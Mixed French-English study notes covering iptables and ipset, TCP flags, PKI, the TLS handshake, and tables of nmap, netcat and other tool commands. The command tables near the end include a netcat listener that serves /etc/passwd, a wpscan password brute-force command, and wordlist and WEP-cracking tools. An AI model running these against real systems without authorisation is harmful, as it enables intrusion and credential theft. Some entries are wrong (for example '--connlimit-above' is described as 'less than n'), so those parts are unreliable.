|                                    | set**                           |
+------------------------------------+---------------------------------+
| **\--tcp-flags \[list_mask\]       | **Match by TCP flag. The first  |
| \[list_comp\]**                    | argument mask is the flags      |
|                                    | which we should examine,        |
|                                    | written as a comma-separated    |
|                                    | list, and the second argument   |
|                                    | comp is a comma-separated list  |
|                                    | of flags which must be set.**   |
+------------------------------------+---------------------------------+
| **-m state \--state                | **Match by packets state.       |
| \[list_state\]**                   | list_state : comma separated    |
|                                    | values in uppercase letters.**  |
+------------------------------------+---------------------------------+
| **-m mac \--mac-source             | **Match by source mac address   |
| \[source_mac_adress\]**            | (it's impossible by destination |
|                                    | mac address )**                 |
+------------------------------------+---------------------------------+
| **-m time \[OPTION\]**             | **Match by Date and Time. See   |
|                                    | the documentation for the       |
|                                    | options.**                      |
+------------------------------------+---------------------------------+
| **-m connlimit \[\--connlimit-upto | **Match by number of existing   |
| \| \--connlimit-above\]            | connections:**                  |
| \[number\]**                       |                                 |
|                                    | **\--connlimit-upto : match if  |
|                                    | the number of existing          |
|                                    | connections is less than n.**   |
|                                    |                                 |
|                                    | **\--connlimit-above : match if |
|                                    | the number of existing          |
|                                    | connections is less than n.**   |
+------------------------------------+---------------------------------+
| **-m limit \[\--limit \|           | **Match by maximum matches per  |
| \--limit-burst \] \[value\]**      | time-unit and before an above   |
|                                    | limit.**                        |
|                                    |                                 |
|                                    | **\--limit : where value is the |
|                                    | maximum matches per time-unit ( |
|                                    | default second )**              |
|                                    |                                 |
|                                    | **\--limit-burst : where value  |
|                                    | is maximum matches before a     |
|                                    | above limit.**                  |
+------------------------------------+---------------------------------+
| **-m recent \[OPTIONS\]**          | **Match with dynamic database   |
|                                    | of blacklisted source IP        |
|                                    | addresses.**                    |
|                                    |                                 |
|                                    | **Options :**                   |
|                                    |                                 |
|                                    | -   **\--name \[name_list\]:    |
|                                    |     > Specify and creates a     |
|                                    |     > blacklist if not          |
|                                    |     > existed.**                |
|                                    |                                 |
|                                    | > **path of the file :          |
|                                    | > /pro                          |
|                                    | c/net/xt_recent/\[name_list\]** |
|                                    |                                 |
|                                    | -   **\--set : Adds the source  |
|                                    |     > IP address to the list.** |
|                                    |                                 |
|                                    | -   **\--update : Checks if the |
|                                    |     > source IP address is in   |
|                                    |     > the list and updates the  |
|                                    |     > "last seen time".**       |
|                                    |                                 |
|                                    | -   **\--rcheck : Checks if the |
|                                    |     > source Ip address is in   |
|                                    |     > the list and doesn\'t     |
|                                    |     > update the "last seen     |
|                                    |     > time".**                  |
|                                    |                                 |
|                                    | -   **\--seconds \[number\]:    |
|                                    |     > Used with \--update or    |
|                                    |     > \--rcheck. Matches the    |
|                                    |     > packet only if the source |
|                                    |     > IP address is in the list |
|                                    |     > and the last seen time is |
|                                    |     > valid.**                  |
+------------------------------------+---------------------------------+
| **-m quota \--quota \[bytes\]**    | **Match by quota ( of packets   |
|                                    | ). When the quota is reached,   |
|                                    | the rule doesn't match any      |
|                                    | more.**                         |
+------------------------------------+---------------------------------+
| **-m set \[OPTION\]**              | **Match using ipset**           |
|                                    |                                 |
|                                    | **option :**                    |
|                                    |                                 |
|                                    | -   **\--match-set \[name_set\] |
|                                    |     > \[dst \| src \]: Use the  |
|                                    |     > specified set of IP       |
|                                    |     > address.**                |
+------------------------------------+---------------------------------+
|                                    |                                 |
+------------------------------------+---------------------------------+

**Differents common options for \[-j TARGET\]:**

  -----------------------------------------------------------------------
  **-j SET \--add-set \[name_set\]     **Add a entry in a set of ipset.**
  \[src \|dst\]**                      
  ------------------------------------ ----------------------------------
                                       

                                       
  -----------------------------------------------------------------------

-   **Rules written in the terminal are not saved after the system is
    > shut down. To persist the rules, you have to write a script
    > automatically executed when the system boots.**

```{=html}
<!-- -->
```
-   **Default Policy can be changed only for INPUT, OUTPUT and FORWARD
    > chains. It can be changed using -P option. This is either accept
    > or drop packet.**

> **Exemple:**
>
> **iptables -P INPUT DROP**

**iptables -P OUTPUT ACCEPT**

**iptables -P FORWARD DROP**

-   **iptables-save \[-c\] \[-t *table*\] \> \[file name\]:**

**Dump the iptables rules in a file. Then, we can load the rules**

> **of this file into memory with this command : iptables-restore**
>
> **\[file name\].**

**option -c : save the bit and packet counter.**

-   **To save iptables rules after restart :**

    -   **Install iptable-persistent.**

**sudo apt update && sudo apt install iptables-persistent**

**iptable-persistent automatically loads rules from this**

> **file : /etc/iptables/rules.v4**

-   **iptables-save \> /etc/iptables/rules.v4 to save iptables rules in
    > this persistent file**

```{=html}
<!-- -->
```
-   **To remove persistent iptables rules:**

**Edit /etc/iptables/rules.v4**

-   **Packets states ( for stateful firewall ):**

    -   **NEW : First packet from a connection.**

    -   **ESTABLISHED : packets that are part of an existing
        > connection.**

    -   **RELATED : packets that are requesting a new connection and are
        > already part of an existing connection ( Ex: FTP).**

    -   **INVALID : Packets that are not part of any existing
        > connection. The packet can\'t be identified or that it does
        > not have any state.**

    -   **UNTRACKED : packets marked within the raw table with the
        > NOTRACK target.**

```{=html}
<!-- -->
```
-   **Ipset is an extension to iptables that allows us to create
    > firewall rules that match entire "sets" of addresses at once.**

> **It's very efficient when dealing with large sets.**
>
> **Ipset lets you create huge lists of ip addresses and/or ports, which
> are stored in a tiny piece of ram with extreme efficiency.**
>
> **Some commands and features :**

-   **ipset \[-N\| create\] \[name\] \[METHOD\] \[OPTION\] : create a
    > new set called \[named\] using the method \[METHOD\] for searching
    > and storing information**

> **( example : hash:ip ).**

-   **ipset \[-A\| add\] \[name\] \[IP_ADR\] : Add the IP address in the
    > set.**

```{=html}
<!-- -->
```
-   **ipset \[-L\| list\] \[name_set\]: Print out all the sets.**

```{=html}
<!-- -->
```
-   **ipset \[del\| -D\] \[name_set\] \[entry\] : Delete the entries in
    > the set.**

```{=html}
<!-- -->
```
-   **ipset \[-F\| flush\] \[name_set\] : Delete all the entries the
    > specified set.**

```{=html}
<!-- -->
```
-   **ipset \[destroy \|-X\] \[name_set\] : Delete the specified set.
    > You can only delete a set if there is no correspondence with a
    > rule in iptables.**

```{=html}
<!-- -->
```
-   **"maxelem" is a variable that corresponds to the maximum elements
    > that a set can contain.**

> **By default, is 65 535.**

#  Network

##  TCP header FLag

![](media/image347.png){width="5.765625546806649in"
height="2.1453488626421695in"}

**SYN : Only the first packet from sender as well as receiver should
have this flag set. This is used for synchronizing sequence number.**

**ACK : It is used to acknowledge packets which are successfully
received by the host. The flag is set if the acknowledgement number
field ( sended ) contains a valid acknowledgement number.**

**RST ( Reset ) : It is used to terminate the connection if the RST
sender feels something is wrong with the TCP connection. It can get sent
from a receiver side when the packet is sent to a particular host that
was not expecting it.**

![](media/image125.png){width="6.267716535433071in"
height="2.6527777777777777in"}

**PUSH : Transport layer by default waits for some time for application
layer to send enough data equal to maximum segment size so that the
number of packets transmitted on the network minimizes, which is not
desirable by some applications like interactive
applications(chatting).**

**Similarly, transport layer at receiver end buffers packets and
transmit to application layer if it meets certain criteria.**

**This problem is solved by using PSH. Receiver transport layer, on
seeing PSH = 1 immediately forwards the data to application layer.**

**In general, it tells the receiver to process these packets as they are
received instead of buffering them.**

**URG ( Urgent ) : Data inside a segment with URG = 1 flag is forwarded
to the application layer immediately even if there are more data to be
given to the application layer. It is used to notify the receiver to
process the urgent packets before processing all other packets. The
receiver will be notified when all known urgent data has been
received.**

![](media/image376.png){width="5.9375in" height="2.15625in"}

**TCP 3-way handShake**

![](media/image136.png){width="6.277694663167104in"
height="4.765625546806649in"}

**MSS : Max Segment Size.**

**WINDOW : When we start a TCP connection, the hosts will use a receive
buffer where we temporarily store data before the application can
process it.**

**When the receiver sends an acknowledgment, it will tell the sender how
much data it can transmit before the receiver will send an
acknowledgment. We call this the window size. Basically, the window size
indicates the size of the receive buffer.**

**TCP connection termination**

![](media/image322.png){width="4.75in" height="3.9791666666666665in"}

-   **Difference between closed and filtered port :**

    -   **Closed port = In some cases, it means that no application is
        > listening on this port. A specific tcp packet is returned.**

    -   **Filtered port = Port opened but packets dropped by a
        > firewall.**

> **Encapsulation des couches :**

![](media/image279.png){width="5.348958880139983in"
height="4.256065179352581in"}

![](media/image174.png){width="5.411458880139983in"
height="4.755251531058618in"}

-   ## Modèle TCP/IP :

> ![](media/image87.png){width="3.682292213473316in"
> height="3.8028707349081365in"}

-   **Le nom de modèle TCP/IP est étroitement lié à deux protocoles : le
    > protocole TCP (Transmission Control Protocol) et le protocole IP
    > (Internet Protocol). Ceci est en partie dû au fait que ce sont les
    > deux protocoles les plus utilisés pour Internet.**

    -   **L'origine du modèle TCP/IP remonte au réseau ARPANET.**

```{=html}
<!-- -->
```
-   **Le protocole UDP intervient lorsque le temps de remise des paquets
    > est prédominant et non la fiabilité.**

    -   **D\'autres protocoles de la couche Transport que TCP, UDP:
        > SCTP, OSPF, SPX, ATP.**

    -   **\...**

```{=html}
<!-- -->
```
-   ## Certificat et PKI:

    -   **PKI (Public Key Infrastructure) est un système de gestion des
        > clefs publiques qui permet de gérer des listes importantes de
        > clefs publiques et d\'en assurer la fiabilité, pour des
        > entités généralement dans un réseau.**

```{=html}
<!-- -->
```
-   **Une infrastructure PKI fournit donc quatre services principaux:**

> **- fabrication de bi-clés.**
>
> **- Certification de clé publique et publication de**
>
> **certificats.**
>
> **- Révocation de certificats.**
>
> **- Gestion de la fonction de certification.**

-   **Une PKI utilise des mécanismes de signature et certifie des clés
    > publiques qui permettent de chiffrer et de signer des messages
    > ainsi que des flux de données, afin d\'assurer la confidentialité,
    > l\'authentification, l\'intégrité et la non-répudiation
    > (l\'émetteur des données ne pourra pas nier être à l\'origine du
    > message car la signature a été faite avec sa clef privée).**

```{=html}
<!-- -->
```
-   **Faiblesse : si l'une quelconque parmi les autorités de
    > certification certifie un site frauduleux, ce certificat sera
    > vérifié correctement par des millions de navigateurs.**

```{=html}
<!-- -->
```
-   **Une des raisons de l\'apparition de la notion de certification est
    > de se prémunir de l'attaque Man In The Middle : On doit être sur
    > que la clé publique utilisée n'appartient pas à un attaquant.**

```{=html}
<!-- -->
```
-   **Chaque navigateur ou service qui utilise des certificats contient
    > une liste de certificats racine approuvés. Lors de la visite d\'un
    > site web avec une connexion TLS/SSL, la validité d\'un certificat
    > est vérifiée en contrôlant les empreintes digitales du certificat
    > et des certificats intermédiaires associés jusqu\'à ce que
    > l\'empreinte digitale du certificat racine coïncide.**

> **Structure d'un Certificat :**

![](media/image262.png){width="5.015625546806649in"
height="4.064540682414698in"}

**En résumé :**

-   **Numero de serie**

```{=html}
<!-- -->
```
-   **Clé publique**

-   **information de l\'autorité de certification qui a signé**

-   **Information sur le détenteur du certificat**

-   **Période de validité**

-   **Signature**

> **Comment vérifier un certificat ?**

![](media/image291.png){width="7.023089457567804in"
height="7.023089457567804in"}

![](media/image17.png){width="5.635416666666667in"
height="4.916666666666667in"}

**Dans une infrastructure à clé publique ; pour obtenir un certificat
numérique, l\'utilisateur fait une demande auprès de l\'autorité
d\'enregistrement. Celle-ci génère un couple de clef (clé publique, clé
privée), envoie la clé privée au client, applique une procédure et des
critères définis par l\'autorité de certification qui certifie la clé
publique et appose sa signature sur le certificat, parfois fabriqué par
un opérateur de certification.**

-   ## Protocole TLS ( Transport Layer Security ) / SSL ( Secure Sockets Layer ) :

    -   **TLS est un protocole qui permet l'établissement d'une
        > connexion sécurisée (chiffrée, intègre et authentifiée).**

    -   **Les protocoles TLS (et SSL) sont situés entre la couche du
        > protocole d'application et la couche TCP/IP, où ils peuvent
        > sécuriser et envoyer des données d'application à la couche de
        > transport. Étant donné que les protocoles fonctionnent entre
        > la couche application et la couche transport, les protocoles
        > TLS et SSL peuvent prendre en charge plusieurs protocoles de
        > la couche application.**

    -   **La principale différence entre SSL et TLS est que ce dernier
        > utilise des algorithmes de chiffrement plus fort et qu'il peut
        > supporter plusieurs extensions.**

    -   **Le protocole TLS est formé par 4 sous protocoles :**

        -   **Protocole Handshake ( Création des clefs )**

        -   **Protocole Record ( application des clefs )**

        -   **Protocole Change Cipher Spec (CCS)**

        -   **Protocole Alert ( Gestion des erreurs )**

```{=html}
<!-- -->
```
-   **1) Protocole Handshake ( TLS Handshake ):**

    -   **C'est le protocole qui régit l'établissement d'une connexion
        > entre deux entités d'un réseau. Il gère l'authentification du
        > serveur et/ou du client, la négociation des algorithmes de
        > chiffrement et la génération des clés symétriques.**

> ![](media/image131.png){width="3.15625in" height="3.9375in"}

-   **1) C -\> S.ClientHello: le client initie une requête en envoyant
    > un message de type ClientHello qui contient:**

    -   **Version: la plus haute version de SSL/TLS que puisse utiliser
        > le client.**

    -   **Random: un horodatage de 32 bits et une valeur aléatoire de 28
        > octets générée par le client qui sera utilisée pour la
        > dérivation des clés. The client random and the server random
        > are later used to generate the key for encryption.**

    -   **CipherSuite: une liste, par ordre décroissant de préférence,
        > des suites cryptographiques que supporte le client.**

> **Cipher suites are identified by strings. A sample cipher suite
> string is ( example ): TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256. This
> string contains the following information:**

-   **TLS is the protocol being used.**

-   **ECDHE is the key exchange algorithm (Elliptic curve
    > Diffie--Hellman Ephemeral).**

> **ECDSA is the authentication algorithm (Elliptic Curve Digital
> Signature Algorithm).**

-   **AES_128_GCM is the data encryption algorithm (Advanced Encryption
    > Standard 128 bit Galois/Counter Mode).**

-   **SHA256 is the Message Authentication Code (MAC) algorithm Secure
    > Hash Algorithm 256 bit).**

    -   **Extensions: les différentes extensions TLS supportées par le
        > client ( extensions such as supported groups for elliptic
        > curve cryptography, point formats for elliptic curve
        > cryptography, signature algorithms, and more).**

> **If the server cannot provide the additional functionality, the
> client may abort the handshake if needed.**

-   **Compression_methods_list : This is the method that is going to be
    > used for compressing the SSL packets. By using compression, we can
    > achieve lower bandwidth usage and therefore, faster transfer
    > speeds. But using compression is risky.**

```{=html}
<!-- -->
```
-   **Session ID: un nombre, qui identifie la connexion; (optionnel).**

> **Et peut être d'autres champs "moins importants".**

-   **2) S -\> C .ServerHello: le serveur répond au client avec un
    > message de type ServerHello. A Server Hello may either contain
    > selected options (from among those proposed during Client Hello)
    > or it may be a handshake failure message. cette étape qui
    > contient:**

    -   **Version: la plus haute version de SSL/TLS que puisse utiliser
        > le serveur ( the selected protocol version );**

    -   **Random: un horodatage de 32 bits et une valeur aléatoire de 28
        > octet;**

    -   **CipherSuite: la suite cryptographique retenue pour la session.
        > Le serveur sélectionne la première suite qu'il connaît dans la
        > liste transmise par le client;**

```{=html}
<!-- -->
```
-   **Compression_methods : The server selects the compression method
    > from among Compression Methods sent in the Client Hello.**

    -   **Extensions: les différentes extensions TLS supportées par le
        > serveur.**

```{=html}
<!-- -->
```
-   **3) S -\> C .ServerCertificate: Le serveur envoie son certificat
    > X509 qui contient des informations sur sa clé publique.**

> **In rare cases, the server may require the client to be authenticated
> with a client certificate. If so, the client provides its signed
> certificate to the server.**

-   **4) S. Server Key Exchange Generation : The server calculates "a
    > private/public keypair" for key exchange ( Diffie-Hellman ).**

> **It will do this via an elliptical curve method ( using sometimes the
> x25519 curve ).**
>
> **The private key is chosen by selecting an integer between 0 and
> 2\^(256-1). It does this by generating 32 bytes (256 bits) of random
> data.**
>
> **The public key is chosen by multiplying the point x=9 on the x25519
> curve by the private key.**

-   **5) S -\> C .ServerKeyExchange : The server provides information
    > for key exchange.**

> **As part of the key exchange process, both the server and the client
> will have a keypair of public and private keys, and will send the
> other party their public key ( using elliptical curve Diffie-Hellman
> method ).**
>
> **The shared encryption key will then be generated using a combination
> of each party\'s private key and the other party\'s public key**
>
> **( Diffie-Hellman ) .**
>
> **Maybe the parties have agreed on a cipher suite using ECDHE, meaning
> the keypairs will be based on a selected Elliptic Curve,
> Diffie-Hellman will be used, and the keypairs are Ephemeral (generated
> for each connection) rather than using the public/private key from the
> certificate.**

-   **6). S -\> C .ServerHelloDone: Le serveur indique qu'il attend une
    > réponse du client. The server indicates it\'s finished with its
    > half of the handshake.**

```{=html}
<!-- -->
```
-   **4) C. Client Key Exchange Generation : Like the server, The client
    > calculates "a private/public keypair" for key exchange with the
    > same method ( using elliptical curve Diffie-Hellman method ).**

```{=html}
<!-- -->
```
-   **6). C -\> S.ClientKeyExchange: Just like the server, The Client
    > provides information for key exchange.**

```{=html}
<!-- -->
```
-   **4) C. Client Encryption calculation : The client now has the
    > information to calculate the encryption keys that will be used by
    > each side.**

> **It uses the following information in this calculation:**

-   **server random (from Server Hello)**

-   **client random (from Client Hello)**

-   **server public key (from Server Key Exchange)**

-   **client private key (from Client Key Generation)**

> **The client multiplies the server\'s public key with the client\'s
> private key using the curveXXXX() algorithm. The 32-byte result is
> called the PreMasterSecret.**
>
> **The client then calculates the MasterSecret ( 48 bytes ) from the
> PreMasterSecret, client_random, server_random.**
>
> **Cette transformation est essentielle car le PreMasterSecret est
> d'une taille différente selon la méthode utilisée pour sa génération.
> Il faut donc dériver cette valeur en une autre avec une valeur
> constante ( MasterSecret de 48 byte ).**
>
> **We then generate the final encryption keys using the MasterSecret,
> client_random, server_random.**

**final encryption keys :**

-   **client MAC key: For client authentication and integrity with
    > whatever MAC algorithm you chose in the cipher suite.**

-   **server MAC key: For server authentication and integrity with
    > whatever MAC algorithm you chose in the cipher suite.**

-   **client write key : For the symmetric encryption.**

-   **server write key : For the symmetric encryption.**

-   **client write IV : IV used by a mode of operation of some symmetric
    > algorithm that could be chosen.**

-   **server write IV : IV used by a mode of operation of some symmetric
    > algorithm that could be chosen.**

**The symmetric ciphers chosen in the handshake will dictate**

> **how long these keys we generate need to be.**
>
> **To recap :**
>
> **Diffie-Hellman -\> PreMasterSecret -\> MasterSecret ( 48 bytes ) -\>
> 4 ( or 6 with IV ) variable-length keys.**

-   **7). C -\> S .ChangeCipherSpec: The client indicates that it has
    > calculated the shared encryption keys and that all following
    > messages from the client will be encrypted with the client write
    > key.**

> **In TLS 1.3, this message type has been removed because it can be
> inferred.**
>
> **At this point, the client is ready to switch to a secure, encrypted
> environment. The Change Cipher Spec protocol is used to change the
> encryption.**

-   **8). C -\> S .Finished: To verify that the handshake was successful
    > and not tampered with, the client calculates verification data and
    > encrypts it with the client write key.**

**The verification data is built from a hash of all handshake messages
and verifies the integrity of the handshake process.**

-   **4) S. Server Encryption calculation : Same as the client :
    > calculate the Final Keys.**

```{=html}
<!-- -->
```
-   **9). S -\> C .ChangeCipherSpec: pareil côté serveur.**

```{=html}
<!-- -->
```
-   **10). S -\> C .Finished: pareil coté server. The last message of
    > the handshake process from the server (sent encrypted) signifies
    > that the handshake is finished.**

```{=html}
<!-- -->
```
-   **2) Protocole Record**

    -   **C'est le protocole qui gère la transmission des données
        > chiffrées sous une forme homogène en les encapsulant, il a
        > pour objectifs:**

        -   **Confidentialité: les données sont chiffrées en utilisant
            > les clés produites lors de la négociation.**

        -   **Intégrité et Authenticité: Grâce aux signatures HMAC.
            > Cette signature est elle aussi générée à l'aide des clés
            > produites lors de la négociation.**

        -   **Encapsulation: permet aux données SSL/TLS d'être
            > transmises de manière normalisée et reconnues sous une
            > forme homogène.**

> **Les étapes du processus d'encapsulation du protocole Record sont les
> suivantes:**
>
> ![](media/image72.png){width="4.291666666666667in"
> height="3.6041666666666665in"}

-   **Segmentation: les données sont découpées en blocs de taille
    > inférieure à 16 ko;**

-   **Compression: les données sont compressées en utilisant
    > l'algorithme choisi lors de la négociation. A noter: à partir de
    > SSL v3.0, il n'y a plus de compression;**

-   **Signature MAC: une signature des données est générée à l'aide de
    > la clé MAC (dans le cas de l'utilisation de l'extension
    > MAC_then_encrypt);**

-   **Chiffrement: le paquet obtenu est chiffré à l'aide de la fonction
    > définie lors de la négociation et de la key.encryption;**

-   **Ajout de l'en-tête: l'en-tête SSL/TLS est ajouté et le paquet est
    > passé à la couche inférieure. Il contient:**

    -   **Content-Type: indique le type de paquet SSL et TLS contenu
        > dans l'enregistrement;**

    -   **Major Version, Minor Version: numéros de version du protocole
        > SSL/TLS utilisé;**

    -   **Length: taille du fragment SSL et TLS.**

**À la réception des paquets, le destinataire vérifie l'en-tête du**

> **paquet, le déchiffre, vérifie le champ HMAC et rassemble les**
>
> **différents blocs.**
>
> **The handshake can currently use 5 different algorithms to do the key
> exchange: RSA, Diffie-Hellman, Elliptic Curve Diffie-Hellman and the
> ephemeral versions of the last two algorithms.**
>
> **On peut noter que les données chiffrées sont seulement ceux de la
> Couche Application.**

-   **3) Protocole Change Cipher Spec**

    -   **Ce protocole contient un seul message de 1 octet
        > ChangeCipherSpec et permet de modifier les algorithmes de
        > chiffrement et établir de nouveaux paramètres de sécurité. Il
        > indique au protocole Record le changement des suites
        > cryptographiques.**

-   **4) Protocole Alert**

    -   **Ce protocole spécifie les messages d'erreur que peuvent
        > s'envoyer clients et serveurs. Les messages sont composés de
        > deux octets. Le premier est soit warning ( connexion instable
        > ) soit fatal.**

> **Si le niveau est fatal, la connexion est abandonnée.**
>
> **Le deuxième octet donne le code d'erreur.**

**Exemple de type d'erreurs :**

+-----------------------------------+-----------------------------------+
| **erreurs fatales**               | **Warnings**                      |
+===================================+===================================+
| -   **Unexpected_message --       | -   **Close_notify -- annonce la  |
|     > indique que le message n'a  |     > fin d'une connexion**       |
|     > pas été reconnu**           |                                   |
|                                   | ```{=html}                        |
| ```{=html}                        | <!-- -->                          |
| <!-- -->                          | ```                               |
| ```                               | -   **No_certificate -- répond    |
| -   **Bad_record_mac -- signale   |     > une demande de certificat   |
|     > une signature MAC           |     > s'il n'y en a pas**         |
|     > incorrecte**                |                                   |
|                                   | ```{=html}                        |
| -   **Decompression_failure --    | <!-- -->                          |
|     > indique que la fonction de  | ```                               |
|     > décompression a reçu une    | -   **Bad_certificate -- le       |
|     > mauvaise entrée**           |     > certificat reçu n'est pas   |
|                                   |     > bon (par exemple, sa        |
| ```{=html}                        |     > signature n'est pas         |
| <!-- -->                          |     > valide)**                   |
| ```                               |                                   |
| -   **Handshake_failure --        | ```{=html}                        |
|     > impossible de négocier les  | <!-- -->                          |
|     > bons paramètres**           | ```                               |
|                                   | -   **Unsupported_certificate --  |
| ```{=html}                        |     > le certificat reçu n'est    |
| <!-- -->                          |     > pas reconnu**               |
| ```                               |                                   |
| -   **Illegal_parameter --        | ```{=html}                        |
|     > indique un champ mal        | <!-- -->                          |
|     > formaté ou ne correspondant | ```                               |
|     > à rien.**                   | -   **Certificate_revoked --      |
|                                   |     > certificat révoqué par      |
|                                   |     > l'émetteur**                |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Certificate_expired --      |
|                                   |     > certificat expiré**         |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Certificate_unknown -- pour |
|                                   |     > tout**                      |
|                                   |                                   |
|                                   | **problème concernant les**       |
|                                   |                                   |
|                                   | **certificats et non listé**      |
|                                   |                                   |
|                                   | **ci-dessus.**                    |
+-----------------------------------+-----------------------------------+

![](media/image434.png){width="6.267716535433071in"
height="4.694444444444445in"}

**Ephemeral Diffie-Hellman (DHE in the context of TLS) differs from the
static Diffie-Hellman (DH) in the way that static Diffie-Hellman key
exchanges also always use the same Diffie-Hellman private keys. So, each
time the same parties do a DH key exchange, they end up with the same
shared secret.**

**Within TLS you will often use DHE as part of a key-exchange that uses
an additional authentication mechanism (e.g. RSA, PSK or ECDSA).**

**So the fact that the TLS server signs the content of its server key
exchange message that contains the ephemeral public key implies to the
SSL client that this Diffie-Hellman public key is from the SSL server.**

-   **In most cases, the best way to protect yourself against
    > SSL/TLS-related attacks is to disable older protocol versions.**

```{=html}
<!-- -->
```
-   **What are the advantages of using the latest TLS version?**

> **In a nutshell, TLS 1.3 is faster and more secure than TLS 1.2.**
>
> **One of the changes that makes TLS 1.3 faster is an update to the way
> a TLS handshake works.**
>
> **Many of the major vulnerabilities in TLS 1.2 had to do with older
> cryptographic algorithms that were still supported.**
>
> **TLS 1.3 drops support for these vulnerable cryptographic algorithms,
> and as a result it is less vulnerable to cyber attacks.**

**some useful command**

  --------------------------------------------------------------------------------------------------------------------------
  **tcpdump -i eth0 udp port 53**                                                        **Sniffer les packet UDP vers le
                                                                                         port 53 sur l'interface eth0**
  -------------------------------------------------------------------------------------- -----------------------------------
  **sudo socat -v -v                                                                     **Run your own server WEB with TLS
  openssl-listen:443,reuseaddr,fork,cert=\$FILENAME.pem,cafile=\$FILENAME.crt,verify=0   support ( with certificate )**
  -**                                                                                    

                                                                                         

                                                                                         
  --------------------------------------------------------------------------------------------------------------------------

-   **Protocole IPsec :**

    -   

```{=html}
<!-- -->
```
-   **...**

-   **...**

-   **...**

-   **\...**

**Some Nmap commands**

+-----------------------------------+-----------------------------------+
| **nmap -sn \[TARGET\]**           | **Launch a ping scan against a    |
|                                   | network segment**                 |
|                                   |                                   |
|                                   | **Ping scans in Nmap may also     |
|                                   | identify MAC addresses and        |
|                                   | vendors if executed as a          |
|                                   | privileged user on local Ethernet |
|                                   | networks.**                       |
|                                   |                                   |
|                                   | **Can be used to find hosts on    |
|                                   | the same network.**               |
+===================================+===================================+
| **nmap -A \[TARGET\]**            | **Aggressive mode :**             |
|                                   |                                   |
|                                   | **This mode sends a lot more      |
|                                   | probes, and it is more likely to  |
|                                   | be detected, but provides a lot   |
|                                   | of valuable host information.**   |
+-----------------------------------+-----------------------------------+
| **nmap -p- \[TARGET\]**           | **scan all ports**                |
+-----------------------------------+-----------------------------------+
| **nmap -sU**                      | **UDP scan**                      |
+-----------------------------------+-----------------------------------+
| **nmap -Pn**                      | **Treat all hosts as online \--   |
|                                   | skip host discovery.**            |
|                                   |                                   |
|                                   | **This option will force the      |
|                                   | scanning even if it has detected  |
|                                   | the target as down in host        |
|                                   | discovery**                       |
+-----------------------------------+-----------------------------------+
| **nmap -sV**                      | **application version             |
|                                   | information**                     |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   **It used for :**

    -   **1) Network mapping & host discovery**

    -   **2) Port Scanning**

    -   **3) OS detection**

    -   **4) Service Version Detection**

    -   **5) Service Enumeration**

    -   **6) Firewall Detection & Evasion**

```{=html}
<!-- -->
```
-   

**Some Netcat Commands**

+-----------------------------------+-----------------------------------+
| **nc exemple.local 10222**        | **Se connecter sur le serveur     |
|                                   | exemple.local au port 10222**     |
+===================================+===================================+
| **nc -l 10222**                   | **Écouter un port sur notre       |
|                                   | installation**                    |
+-----------------------------------+-----------------------------------+
| **nc -l 192.168.0.2 10222**       | **Écouter un port sur notre       |
|                                   | installation sur l'interface      |
|                                   | précisée.**                       |
+-----------------------------------+-----------------------------------+
| **netcat -c \'cat /etc/passwd\'   | **-c : specify shell commands to  |
| -l -p 1234**                      | exec after someone connect to     |
|                                   | us**                              |
|                                   |                                   |
|                                   | **-p : port number for            |
|                                   | listening**                       |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

**Some useful tools and commands ( pas que réseau )**

+----------------------------------+-----------------------------------+
| **netdiscover**                  | **Découvre toutes les hosts dans  |
|                                  | un même réseau.**                 |
| **arp-scan \--localnet**         |                                   |
+==================================+===================================+
| **wpscan \--url "\[URL\]"        | **Trouver des vulnérabilité si il |
| \--enumerate**                   | y a Wordpress utiliser**          |
+----------------------------------+-----------------------------------+
| **wpscan \--url "\[URL\]" -U     | **Bruteforcer le mdp d'un user    |
| \[USER_NAME\] -P \[WORDLIST\]**  | sur wordpress**                   |
+----------------------------------+-----------------------------------+
| **cewl**                         | **CeWL is a ruby app which        |
|                                  | spiders a given url to a          |
| **cewl "\[URL\]" \> cewl3.txt**  | specified depth, optionally       |
|                                  | following external links, and     |
|                                  | returns a list of words which can |
|                                  | then be used for password         |
|                                  | crackers such as John the         |
|                                  | Ripper**                          |
+----------------------------------+-----------------------------------+
| **weplab**                       | **tools to analyse WEP protocol   |
|                                  | et crack WEP key in pcap.file**   |
+----------------------------------+-----------------------------------+

**Some protocols**

  -----------------------------------------------------------------------
  **SMTP, POP3, Internet Message      **protocoles liées au mail**
  Access Protocol (IMAP)**            
  ----------------------------------- -----------------------------------
  **NFS**                             

                                      

                                      

                                      
  -----------------------------------------------------------------------

-   **Connecting with telnet ( instead SSH ) is insecure as anyone who
    > can see the traffic, or access a packet capture of the connection
    > is able to see the username and password used as well as all the
    > commands that the user executed.**

![](media/image138.png){width="6.145833333333333in"
height="7.104166666666667in"}

![](media/image41.png){width="6.267716535433071in" height="2.625in"}

> **\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**
>
> **Dans les algorithmes de chiffrement par flot, une suite d'octets ou
> de bits est produite à partir de la clé.**
>
> **Cette suite est combinée ( avec un XOR ou autre ) aux octets du
> clair pour donner les octets du chiffré.**

-   **Protocol SMTP**

> **SMTP signifie Simple Message Transfer Protocole, ce protocole est
> utilisé pour transférer les messages électroniques sur les réseaux.**
>
> **Son Port est 25. Il fait partie de la couche Application.**
>
> **Son principal objectif est de router les mails à partir de
> l\'adresse du destinataire.**
>
> **Fonctionnement avec un exemple :**

![](media/image103.png){width="6.267716535433071in"
height="6.111111111111111in"}

![](media/image408.png){width="6.267716535433071in"
height="1.8888888888888888in"}

> **Sur internet, les MTA communiquent entre-eux grâce au protocole SMTP
> et sont logiquement appelés serveurs SMTP (parfois serveur de courrier
> sortant).**
>
> **Il existe deux principaux protocoles permettant de relever le
> courrier sur un MDA : POP3 et IMAP.**
>
